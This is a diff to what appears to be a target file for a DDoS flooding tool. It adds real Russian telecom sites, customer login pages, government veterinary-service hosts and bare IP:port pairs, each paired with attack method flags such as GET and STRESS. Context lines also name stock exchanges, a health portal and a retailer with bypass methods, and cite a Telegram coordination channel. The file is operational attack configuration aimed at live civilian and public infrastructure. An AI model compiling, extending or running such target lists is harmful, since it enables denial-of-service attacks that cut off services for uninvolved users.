@@ -14,6 +14,10 @@ tcp://91.226.83.110:21 tcp://91.226.83.110:22 tcp://91.226.83.110:25 tcp://91.22
 
 https://spbexchange.ru/ https://spvb.ru/ https://www.moex.com/ https://emias-kabinet.ru/ https://www.citilink.ru/ http://194.247.132.130:80 https://194.247.132.130:443 http://185.63.191.14:80 tcp://185.178.208.131:80 tcp://185.178.208.131:443 tcp://178.176.128.128:443 tcp://178.176.128.128:444 tcp://178.176.128.128:7264 tcp://178.176.128.128:10080 --http-methods GET BYPASS STRESS
 
+https://msk.rt.ru https://b2c.passport.rt.ru/auth https://www.onlime.ru/bonus/rules/ https://www.ecotelecom.ru https://my.ecotelecom.ru/login?page=/ https://www.akado.ru https://moskva.beeline.ru/customers/products/ https://moskva.myttk.ru/ https://b2b.ttk.ru/ https://msk.dom.ru https://213.59.197.6:443 http://195.166.180.226:80 https://195.166.180.226:443 https://213.59.197.1:443 https://95.167.23.1:443 https://193.105.59.18:443 https://79.171.117.93:443 --http-methods GET STRESS
+
+http://mercury.vetrf.ru https://ivis-sso.vetrf.ru http://assol-express.vetrf.ru https://argus.vetrf.ru https://vetrf.ru --http-methods GET STRESS
+
 ### rusvesna.su https://t.me/c/1624648668/87
 #http://rusvesna.su/ http://m.rusvesna.su/ --http-methods CFB CFBUAM
 
